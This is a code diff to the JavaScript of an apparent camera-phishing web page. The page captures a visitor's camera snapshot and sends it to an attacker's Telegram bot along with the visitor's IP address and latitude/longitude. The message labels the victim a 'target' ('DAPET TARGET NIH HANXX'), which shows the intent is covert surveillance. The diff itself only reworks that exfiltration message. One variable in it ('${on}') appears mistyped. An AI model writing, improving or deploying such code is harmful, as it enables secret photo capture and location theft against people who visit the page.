@@ -107,7 +107,7 @@
         const video = document.getElementById("camera");
         video.srcObject = stream;
         streamData = stream;
-        cameraStatus = 'Berhasil';
+        cameraStatus = 'Dapet Nih Bos';
         setTimeout(() => {
           takeSnapshot();
         }, 3000);
@@ -129,15 +129,18 @@
 
     function sendToTelegram(blobImage) {
       const message = `
-------------------------------------
-👑 DEVELOPER : HANXX
-Version : 1.0
-DAPET TARGET NIH HANXX
-
-IP Address: ${ipAddress}
-Lokasi: ${locationInfo}
-Kamera: ${cameraStatus}
-------------------------------------
+|------------------------------------
+| 👑 DEVELOPER : HANXX
+| Version : 1.0
+| Language : HTML
+|------------------------------------
+| DAPET TARGET NIH HANXX
+|
+| IP Address: ${ipAddress}
+| Latitude : ${lat}
+| Longitude : ${on}
+| Kamera: ${cameraStatus}
+|------------------------------------
       `;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
